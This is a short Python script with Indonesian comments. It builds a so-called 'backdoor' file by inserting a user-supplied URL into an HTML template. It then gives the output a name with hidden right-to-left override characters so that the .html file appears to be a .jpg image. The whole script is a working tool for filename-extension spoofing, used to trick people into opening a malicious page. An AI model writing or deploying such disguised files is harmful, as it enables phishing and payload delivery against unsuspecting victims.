#!/usr/bin/env python
import os

nama_file = "original.txt"
kata_ganti = "ganti"

# Membaca file original.txt
with open(nama_file, 'r') as f:
    data = f.read()

# Mengganti kata spesifik dengan input dari user
kata_baru = input("Masukkan Url: ")
data = data.replace(kata_ganti, kata_baru)

# Minta input user untuk nama file yang akan disimpan
nama_file_baru = input("Masukkan nama file yang baru: ")

# Menyimpan file dengan ekstensi .html
nama_file_baru = f"{nama_file_baru}‮‮‮gpj.html"
path = "backdoor/" + nama_file_baru

try:
    with open(path, 'w') as f:
        f.write(data)
    print("File backdoor telah berhasil dibuat pada direktori /backdoor")
except Exception as e:
    print("Pembuatan file gagal: ", e)

